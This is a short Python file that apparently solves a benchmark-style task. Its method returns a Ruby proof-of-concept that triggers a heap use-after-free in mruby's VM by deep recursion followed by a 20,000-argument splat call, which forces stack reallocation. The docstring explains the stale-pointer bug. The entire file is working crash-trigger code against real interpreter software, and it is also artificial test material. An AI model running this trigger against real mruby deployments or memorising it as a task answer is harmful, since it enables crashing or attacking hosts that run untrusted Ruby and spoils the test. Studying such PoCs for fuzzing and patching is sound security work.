import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to a Heap Use-After-Free in mruby's VM stack handling.
        Specifically, when 'mrb_stack_extend' is called (e.g., due to a large number of arguments),
        the stack memory may be reallocated. If the VM loop holds a stale pointer ('regs') 
        to the old stack and uses it after the extension, a crash occurs.
        
        The PoC uses recursion to occupy stack space and then executes a method call with 
        a large splat argument to force stack reallocation.
        """
        poc = (
            "def trigger(n)\n"
            "  if n > 0\n"
            "    trigger(n - 1)\n"
            "  else\n"
            "    # At the deepest recursion level, call a method with many arguments.\n"
            "    # Unpacking the array onto the stack forces mrb_stack_extend.\n"
            "    # If the stack moves, cached pointers in the VM become invalid (UAF).\n"
            "    target(*Array.new(20000, 0))\n"
            "  end\n"
            "end\n"
            "\n"
            "def target(*args)\n"
            "  # The crash usually happens during call setup, before we get here.\n"
            "end\n"
            "\n"
            "# Start recursion to setup a specific stack layout\n"
            "trigger(100)\n"
        )
        return poc.encode('utf-8')